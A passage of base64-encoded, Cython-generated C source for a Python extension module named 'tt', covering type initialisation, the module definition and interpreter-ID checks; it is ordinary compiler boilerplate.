F9HZW5lcmljR2V0QXR0cikpIHtcbiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbC0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKVxuICAjZWxzZVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHI7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7XG4gIH1cbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEUwMDAwXG4gIFB5VW5zdGFibGVfT2JqZWN0X0VuYWJsZURlZmVycmVkUmVmY291bnQoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICBQeVVuc3RhYmxlX09iamVjdF9FbmFibGVEZWZlcnJlZFJlZmNvdW50KChQeU9iamVjdCopX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7XG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjtcbiAgfVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gICNlbHNlXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgPSAmX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzNCwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwRTAwMDBcbiAgUHlVbnN0YWJsZV9PYmplY3RfRW5hYmxlRGVmZXJyZWRSZWZjb3VudCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7XG4gIH1cbiAgI2VuZGlmXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIC0xO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpOyBcbnN0YXRpYyBpbnQgX19weXhfcHltb2RfZXhlY190dChQeU9iamVjdCogbW9kdWxlKTsgXG5zdGF0aWMgUHlNb2R1bGVEZWZfU2xvdCBfX3B5eF9tb2R1bGVkZWZfc2xvdHNbXSA9IHtcbiAge1B5X21vZF9jcmVhdGUsICh2b2lkKilfX3B5eF9weW1vZF9jcmVhdGV9LFxuICB7UHlfbW9kX2V4ZWMsICh2b2lkKilfX3B5eF9weW1vZF9leGVjX3R0fSxcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gIHtQeV9tb2RfZ2lsLCBQeV9NT0RfR0lMX1VTRUR9LFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAge1B5X21vZF9tdWx0aXBsZV9pbnRlcnByZXRlcnMsIFB5X01PRF9NVUxUSVBMRV9JTlRFUlBSRVRFUlNfTk9UX1NVUFBPUlRFRH0sXG4gICNlbmRpZlxuICB7MCwgTlVMTH1cbn07XG4jZW5kaWZcblxuI2lmZGVmIF9fY3BsdXNwbHVzXG5uYW1lc3BhY2Uge1xuICBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID1cbiAgI2Vsc2VcbiAgc3RhdGljIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWYgPVxuICAjZW5kaWZcbiAge1xuICAgICAgUHlNb2R1bGVEZWZfSEVBRF9JTklULFxuICAgICAgInR0IixcbiAgICAgIDAsIFxuICAgICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICAgc2l6ZW9mKF9fcHl4X21zdGF0ZXR5cGUpLCBcbiAgICAjZWxzZVxuICAgICAgKENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCkgPyAwIDogLTEsIFxuICAgICNlbmRpZlxuICAgICAgX19weXhfbWV0aG9kcyAsXG4gICAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAgICAgX19weXhfbW9kdWxlZGVmX3Nsb3RzLCBcbiAgICAjZWxzZVxuICAgICAgTlVMTCwgXG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgICBfX3B5eF9tX3RyYXZlcnNlLCBcbiAgICAgIF9fcHl4X21fY2xlYXIsIFxuICAgICAgTlVMTCBcbiAgICAjZWxzZVxuICAgICAgTlVMTCwgXG4gICAgICBOVUxMLCBcbiAgICAgIE5VTEwgXG4gICAgI2VuZGlmXG4gIH07XG4gICNpZmRlZiBfX2NwbHVzcGx1c1xufSBcbiNlbmRpZlxuXG5cbiNpZm5kZWYgQ1lUSE9OX05PX1BZSU5JVF9FWFBPUlRcbiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBQeU1PRElOSVRfRlVOQ1xuI2Vsc2VcbiAgI2lmZGVmIF9fY3BsdXNwbHVzXG4gICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgZXh0ZXJuICJDIiBQeU9iamVjdCAqXG4gICNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlPYmplY3QgKlxuICAjZW5kaWZcbiNlbmRpZlxuXG5fX1B5eF9QeU1PRElOSVRfRlVOQyBQeUluaXRfdHQodm9pZCkgQ1lUSE9OX1NNQUxMX0NPREU7IFxuX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X3R0KHZvaWQpXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG57XG4gIHJldHVybiBQeU1vZHVsZURlZl9Jbml0KCZfX3B5eF9tb2R1bGVkZWYpO1xufVxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcXFxuICAgICAgfHwgKChkZWZpbmVkKF9XSU4zMikgfHwgZGVmaW5lZChXSU4zMikgfHwgZGVmaW5lZChNU19XSU5ET1dTKSkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDApKVxuc3RhdGljIFBZX0lOVDY0X1QgX19QeXhfR2V0Q3VycmVudEludGVycHJldGVySWQodm9pZCkge1xuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX2ludGVycHJldGVycyIpOyAvLyAzLjEzKyBJIHRoaW5rXG4gICAgICAgIGlmICghbW9kdWxlKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpOyAvLyBqdXN0IHRyeSB0aGUgMy44LTMuMTIgdmVyc2lvblxuICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJfeHhzdWJpbnRlcnByZXRlcnMiKTtcbiAgICAgICAgICAgIGlmICghbW9kdWxlKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBQeU9iamVjdCAqY3VycmVudCA9IFB5T2JqZWN0X0NhbGxNZXRob2QobW9kdWxlLCAiZ2V0X2N1cnJlbnQiLCBOVUxMKTtcbiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgICAgIGlmICghY3VycmVudCkgZ290byBiYWQ7XG4gICAgICAgIGlmIChQeVR1cGxlX0NoZWNrKGN1cnJlbnQpKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbmV3X2N1cnJlbnQgPSBQeVNlcXVlbmNlX0dldEl0ZW0oY3VycmVudCwgMCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoY3VycmVudCk7XG4gICAgICAgICAgICBjdXJyZW50ID0gbmV3X2N1cnJlbnQ7XG4gICAgICAgICAgICBpZiAoIW5ld19jdXJyZW50KSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBsb25nIGxvbmcgYXNfY19pbnQgPSBQeUxvbmdfQXNMb25nTG9uZyhjdXJyZW50KTtcbiAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpO1xuICAgICAgICByZXR1cm4gYXNfY19pbnQ7XG4gICAgfVxuICBiYWQ6XG4gICAgUHlTeXNfV3JpdGVTdGRlcnIoIl9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkIGZhaWxlZC4gVHJ5IHNldHRpbmcgdGhlIEMgZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVD0wXFxuIik7XG4gICAgcmV0dXJuIC0xO1xufVxuI2VuZGlmXG4jaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcih2b2lkKSB7XG4gICAgc3RhdGljIFBZX0lOVDY0X1QgbWFpbl9pbnRlcnByZXRlcl9pZCA9IC0xO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgJiYgZGVmaW5lZChHUkFBTFBZX1ZFUlNJT05fTlVNKSAmJiBHUkFBTFBZX1ZFUlNJT05fTlVNID4gMHgxOTAwMDAwMFxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IEdyYWFsUHlJbnRlcnByZXRlclN0YXRlX0dldElERnJvbVRocmVhZFN0YXRlKFB5VGhyZWFkU3RhdGVfR2V0KCkpO1xuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJREZyb21UaHJlYWRTdGF0ZShQeVRocmVhZFN0YXRlX0dldCgpKTtcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXFxcbiAgICAgIHx8ICgoZGVmaW5lZChfV0lOMzIpIHx8IGRlZmluZWQoV0lOMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUykpICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwKSlcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCgpO1xuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChQeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuI2Vsc2VcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoUHlUaHJlYWRTdGF0ZV9HZXQoKS0+aW50ZXJwKTtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShjdXJyZW50X2lkID09IC0xKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIGlmIChtYWluX2ludGVycHJldGVyX2lkID09IC0xKSB7XG4gICAgICAgIG1haW5faW50ZXJwcmV0ZXJfaWQgPSBjdXJyZW50X2lkO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KG1haW5faW50ZXJwcmV0ZXJfaWQgIT0gY3VycmVudF9pZCkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfSW1wb3J0RXJyb3IsXG4gICAgICAgICAgICAiSW50ZXJwcmV0ZXIgY2hhbmdlIGRldGVjdGVkIC0gdGhpcyBtb2R1bGUgY2FuIG9ubHkgYmUgbG9hZGVkIGludG8gb25lIGludGVycHJldGVyIHBlciBwcm9jZXNzLiIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoUHlPYmplY3QgKnNwZWMsIFB5T2JqZWN0ICptb2RkaWN0LCBjb25zdCBjaGFyKiBmcm9tX25hbWUsIGNvbnN0IGNoYXIqIHRvX25hbWUsIGludCBhbGxvd19ub25lKVxue1xuICAgIFB5T2JqZWN0ICp2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgZnJvbV9uYW1lKTtcbiAgICBpbnQgcmVzdWx0ID0gMDtcbiAgICBpZiAobGlrZWx5KHZhbHVlKSkge1xuICAgICAgICBpZiAoYWxsb3dfbm9uZSB8fCB2YWx1ZSAhPSBQeV9Ob25lKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBQeURpY3RfU2V0SXRlbVN0cmluZyhtb2RkaWN0LCB0b19uYW1lLCB2YWx1ZSk7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKHZhbHVlKTtcbiAgICB9IGVsc2UgaWYgKFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSB7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZikge1xuICAgIFB5T2JqZWN0ICptb2R1bG